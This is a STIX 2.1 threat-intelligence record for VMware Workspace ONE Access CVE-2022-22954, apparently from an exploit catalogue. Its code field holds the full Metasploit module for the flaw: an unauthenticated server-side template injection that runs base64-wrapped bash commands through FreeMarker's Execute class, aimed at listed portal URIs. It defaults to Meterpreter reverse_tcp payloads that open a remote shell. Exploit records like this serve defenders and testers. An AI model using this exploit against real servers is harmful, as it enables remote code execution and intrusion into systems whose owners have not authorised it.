{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f929fa16-17e7-481c-8c4e-dd56becceabc",
    "created": "2024-08-14T17:04:34.796686Z",
    "modified": "2024-08-14T17:04:34.79669Z",
    "name": "VMware Workspace ONE Access CVE-2022-22954",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_workspace_one_access_cve_2022_22954.rb",
            "external_id": "vmware_workspace_one_access_cve_2022_22954.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22954"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2022-0005/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sherlocksecurity/VMware-CVE-2022-22954"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware Workspace ONE Access CVE-2022-22954',\n        'Description' => %q{\n          This module exploits CVE-2022-22954, an unauthenticated server-side\n          template injection (SSTI) in VMware Workspace ONE Access, to execute\n          shell commands as the \"horizon\" user.\n        },\n        'Author' => [\n          'mr_me', # Discovery\n          'Udhaya Prakash', # (@sherlocksecure of Poshmark Inc.) PoC\n          'wvu' # Exploit and independent analysis\n        ],\n        'References' => [\n          ['CVE', '2022-22954'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0011.html'],\n          ['URL', 'https://srcincite.io/advisories/src-2022-0005/'],\n          ['URL', 'https://github.com/sherlocksecurity/VMware-CVE-2022-22954'],\n          ['URL', 'https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis']\n          # More context: https://twitter.com/wvuuuuuuuuuuuuu/status/1519476924757778433\n        ],\n        'DisclosureDate' => '2022-04-06',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])\n    ])\n\n    deregister_options('VHOST')\n  end\n\n  def check\n    ret = execute_command(\"echo #{token = rand_text_alphanumeric(8..16)}\")\n\n    return CheckCode::Unknown unless ret\n    return CheckCode::Safe unless ret.match?(/device (?:id|type): #{token}/)\n\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Pass cmd to bash without word splitting\n    bash_cmd = \"bash -c {eval,$({echo,#{Rex::Text.encode_base64(cmd)}}|{base64,-d})}\"\n\n    vprint_status(\"Executing command: #{bash_cmd}\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, ssti_uri),\n      'vhost' => rand_text_alphanumeric(8..16),\n      'vars_get' => {\n        %w[code error].sample => rand_text_alphanumeric(8..16),\n        # https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html\n        ssti_param => %(${\"freemarker.template.utility.Execute\"?new()(\"#{bash_cmd}\")})\n      }\n    }, datastore['CmdExecTimeout'])\n\n    return unless res\n    return '' unless res.code == 400 && res.body.include?('auth.context.invalid')\n\n    res.body\n  end\n\n  def ssti_uri\n    %w[\n      /catalog-portal/hub-ui\n      /catalog-portal/hub-ui/byob\n      /catalog-portal/ui\n      /catalog-portal/ui/oauth/verify\n    ].sample\n  end\n\n  def ssti_param\n    %w[deviceType deviceUdid].sample\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-04-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}